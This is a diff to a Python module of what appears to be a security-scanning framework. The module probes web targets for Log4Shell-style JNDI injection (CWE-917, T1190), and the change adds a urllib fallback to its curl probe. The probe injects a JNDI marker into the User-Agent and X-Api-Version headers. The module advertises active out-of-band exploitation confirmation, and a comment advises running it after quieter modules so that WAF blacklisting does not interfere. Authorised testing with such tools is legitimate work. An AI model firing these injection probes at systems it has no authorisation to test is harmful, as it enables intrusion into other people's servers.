@@ -66,7 +66,7 @@ META = {
     "mitre": ['T1190'],
     "cwe": ['CWE-917'],
     "tactic": 'Initial Access',
-    "requires": ["curl"],   # the default signature/timing probes use curl; --active OOB is pure stdlib
+    "requires": [],   # curl PREFERRED (signature/timing probes); pure-stdlib urllib fallback otherwise
     "active": True,         # advertises the --active out-of-band exploitation-confirmation capability
     # an inline IPS/WAF (Sangfor NGAF / Forcepoint) matches this payload and often
     # BLACKLISTS the source for a window — run it after the quiet modules so the
@@ -109,9 +109,24 @@ _LDAP_BIND_OK = b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00"
 
 
 def _probe(ctx, target, url, ua_value, timeout, w_fmt):
-    cmd = 'curl -s -m%d -L -o %s -A "%s" -H "X-Api-Version: %s" -w "%s" "%s"' % (
-        timeout, os.devnull, ua_value, ua_value, w_fmt, url)
-    return ctx.run_cmd(cmd, target)
+    import shutil
+    if shutil.which("curl"):
+        cmd = 'curl -s -m%d -L -o %s -A "%s" -H "X-Api-Version: %s" -w "%s" "%s"' % (
+            timeout, os.devnull, ua_value, ua_value, w_fmt, url)
+        return ctx.run_cmd(cmd, target)
+    # curl fallback: urllib with the JNDI marker in UA + X-Api-Version; emit the same
+    # HTTP_CODE:/BASELINE_CODE: label the verdict regex reads (000 = no connection).
+    from modules import _util as U
+    label = "BASELINE_CODE" if "BASELINE_CODE" in w_fmt else "HTTP_CODE"
+    t0 = time.time()
+    code, _body, err = U.http_fetch(
+        url, headers={"User-Agent": ua_value, "X-Api-Version": ua_value},
+        ctx=ctx, timeout=timeout, follow=True, want_body=False)
+    dt = time.time() - t0
+    line = "%s:%03d TIME:%.3f" % (label, code, dt)
+    if err:
+        line += "  (python fallback: %s)" % err
+    return "# (python urllib fallback — curl not installed) %s\n%s" % (url, line)
 
 
 def _extract_time(raw):
